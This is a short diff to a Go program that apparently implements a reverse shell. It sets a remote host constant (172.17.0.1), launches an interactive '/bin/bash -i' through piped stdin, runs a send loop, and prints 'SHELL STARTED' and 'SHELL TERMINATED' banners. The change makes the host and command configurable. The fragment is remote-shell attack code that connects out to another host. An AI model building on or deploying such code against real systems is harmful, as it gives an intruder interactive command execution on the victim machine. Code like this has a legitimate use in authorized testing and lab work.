@@ -11,8 +11,8 @@ import (
 	"time"
 )
 
-const RHOST = "172.17.0.1"
-const COMMAND = "/bin/bash"
+var RHOST = "172.17.0.1"
+var COMMAND = []string{"/bin/bash", "-i"}
 
 const MSG_HELLO = "\n----- SHELL STARTED -----\n"
 const MSG_BYE = "\n----- SHELL TERMINATED -----\n"
@@ -30,7 +30,7 @@ var subCmdStdin io.WriteCloser
 func main() {
 	go sendloop()
 
-	subCmd = exec.Command(COMMAND)
+	subCmd = exec.Command(COMMAND[0], COMMAND[1:]...)
 
 	subCmdStdin, _ = subCmd.StdinPipe()
 
